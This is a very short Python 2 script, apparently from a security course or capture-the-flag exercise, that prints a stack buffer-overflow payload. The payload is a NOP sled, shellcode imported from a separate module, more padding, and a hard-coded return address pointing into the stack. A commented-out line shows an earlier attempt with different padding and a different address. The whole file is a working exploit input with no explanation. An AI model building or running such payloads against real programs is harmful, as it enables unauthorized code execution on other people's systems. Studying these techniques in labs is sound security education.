from shellcode import shellcode
#print shellcode + 
print "\x90"*683 + shellcode + "\x90"*300 + "\xf0\xf7\xfe\xbf"
#print "\xAA"*1036 + "\xa0\xf6\xfe\xbf"
